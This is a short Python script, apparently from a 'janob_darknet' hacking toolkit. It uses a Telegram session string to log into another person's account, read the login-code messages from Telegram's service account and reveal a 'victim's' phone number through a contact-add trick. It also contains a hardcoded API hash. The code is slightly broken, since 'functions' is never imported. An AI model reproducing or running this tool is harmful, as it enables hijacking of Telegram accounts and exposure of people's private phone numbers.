from time import sleep
from banners import main
from variables import numbers
from janob_darknet import code
from telethon import TelegramClient, events, sync
from telethon.sessions import StringSession
import os, sys
#print(variables.words)
os.system("clear")
print(main.sys_os)
print(main.janob_darknet)

antiuserbot = input(">>> ")
if antiuserbot == numbers.num1:
	api_id = code.api_id
	api_hash = code.api_hash
	string = code.session
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
		client.send_message("me", client.session.save())
	
	async def main():
	
	    async for message in client.iter_messages(777000):
	        print(message.sender.username, message.text)
	        print("Developed by @janob_darknet")
	        break

	
	with client:
	    client.loop.run_until_complete(main())
#
elif antiuserbot == numbers.num2:
	api_id = 10953300
	api_hash = "9c24426e5d6fa1d441913e3906627f87"
	
	string = code.session
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
		client.send_message("me", client.session.save())
		result = client(functions.contacts.AddContactRequest(
	        id= input("username: "),
	        first_name=code.first_name,
	        last_name=code.last_name,
	        phone=code.you_phone,
	        add_phone_privacy_exception=True
	    ))
	    #print(result.stringify())
	
	client.start()
	print("\033[1;32mThe program has started and you can see the victim's number by logging into your account\n\nTelegram: @sys_os")
	client.run_until_disconnected()

elif antiuserbot == numbers.num3:
	os.system("python terminal.py")
elif antiuserbot == numbers.num4:
	os.system("python device.py")